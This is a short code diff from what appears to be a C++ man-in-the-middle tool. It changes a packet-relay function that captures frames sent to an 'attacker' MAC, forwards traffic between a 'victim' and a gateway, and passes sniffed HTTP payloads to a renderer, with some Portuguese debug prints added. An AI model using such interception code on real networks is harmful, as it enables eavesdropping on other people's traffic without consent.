@@ -59,18 +59,19 @@ void* Pipe::connect(void* args){
 }
 
 void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet){
-	Ethernet* ether = (Ethernet*) packet;
-	if(!memcmp(Globals::attacker.mac, ether->thaddr, 6)){
-		Packet* rcvdPacket = new Packet(packet, header->len);
-
+	printf("Sera que da pau...");
+	Packet* rcvdPacket = new Packet(packet, header->len);
+	printf(" nao\n");
+	if(!memcmp(Globals::attacker.mac, rcvdPacket->ethernet->thaddr, 6)){
 		// Adding packets to the victim queue (send them to the gateway)
-		if(!memcmp(ether->shaddr, Globals::victim.mac->ether_addr_octet, 6)){
+		if(!memcmp(rcvdPacket->ethernet->shaddr, Globals::victim.mac->ether_addr_octet,6)){
 			pthread_mutex_lock(&victimMutex);
 			victimBuffer.push(*rcvdPacket);
 			pthread_mutex_unlock(&victimMutex);
 
 		// Adding packets to the gateway queue (send them to the victim)
-		} else if(!memcmp(ether->shaddr, Globals::gateway.mac->ether_addr_octet, 6)){
+		} else if(!memcmp(rcvdPacket->ethernet->shaddr, Globals::gateway.mac->ether_addr_octet, 6)
+				&& rcvdPacket->ip->dst != Globals::attacker.ip){
 			if(rcvdPacket->len <= 1514){
 				pthread_mutex_lock(&gatewayMutex);
 				gatewayBuffer.push(*rcvdPacket);
@@ -79,7 +80,7 @@ void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned 
 
 			if(rcvdPacket->isHTTP()){
 				printf("[HTTP] Len: %d\n", rcvdPacket->len);
-				HTTP* httpData = new HTTP((unsigned char*)rcvdPacket->getPayload());
+				HTTP* httpData = new HTTP(rcvdPacket->getPayload(), rcvdPacket->getPayloadLen());
 				pthread_mutex_lock(&renderer->rendererMutex);
 				renderer->rendererBuffer.push(*httpData);
 				pthread_mutex_unlock(&renderer->rendererMutex);
